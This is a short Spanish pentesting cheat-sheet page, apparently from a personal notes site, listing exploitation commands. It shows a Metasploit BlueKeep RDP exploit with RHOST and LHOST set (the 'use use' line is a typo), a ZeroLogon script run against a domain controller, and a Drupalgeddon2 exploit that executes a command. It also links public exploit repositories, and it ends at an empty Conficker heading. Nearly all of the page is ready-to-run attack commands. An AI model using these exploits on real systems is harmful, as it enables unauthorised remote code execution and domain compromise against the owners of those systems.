---
layout: article
title: Pentesting - Explotación [Metasploit]
aside:
  toc: true
sidebar:
  nav: side
header:
  theme: dark
  background: black
---
<h2>Escaneo de puertos</h2>

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">RDP - 3389</div>
</div>

**Bluekeep**

~~~bash
use use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOST 192.168.1.100
set LHOST 192.168.1.150
run
~~~

~~~bash

~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">CVEs</div>
</div>


**CVE-2020-1472 - ZeroLogon**

[https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472](https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472)

~~~bash
./zerologon.py example.local DC 10.11.1.220
~~~

**CVE-2018-7600 - Drupal 8.5.x < 8.5.1 / 8.4.x < 8.4.6 / 8.x < 8.3.9 / 7.x? < 7.58 / < 6.x?**

Exploit: [https://github.com/dreadlocked/Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)

~~~bash
./drupalgeddon2-customizable-beta.rb -u http://10.11.1.50/ -v 7 -c id
~~~

**CVE-2008-4250 Conficker - MS08-67**